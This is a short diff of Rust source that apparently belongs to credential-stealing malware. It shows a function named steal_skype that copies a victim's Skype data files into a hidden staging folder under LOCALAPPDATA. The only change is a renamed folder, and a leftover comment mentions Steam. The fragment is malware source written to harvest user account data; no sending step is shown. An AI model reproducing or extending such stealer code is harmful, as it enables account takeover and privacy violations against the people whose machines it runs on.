@@ -9,13 +9,13 @@ pub fn steal_skype() {
         return;
     }
 
-    std::fs::create_dir(format!("{}\\logsxc\\Skype\\", std::env::var("LOCALAPPDATA").unwrap())).unwrap();
+    std::fs::create_dir(format!("{}\\logscx\\Skype\\", std::env::var("LOCALAPPDATA").unwrap())).unwrap();
 
     
 
     for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
            
-       let _ =  std::fs::copy(entry.path(), &format!("{}\\logsxc\\Skype\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())); // Copy Steam shit
+       let _ =  std::fs::copy(entry.path(), &format!("{}\\logscx\\Skype\\{}", &std::env::var("LOCALAPPDATA").unwrap(), entry.file_name().to_str().unwrap())); // Copy Steam shit
     }
 
 
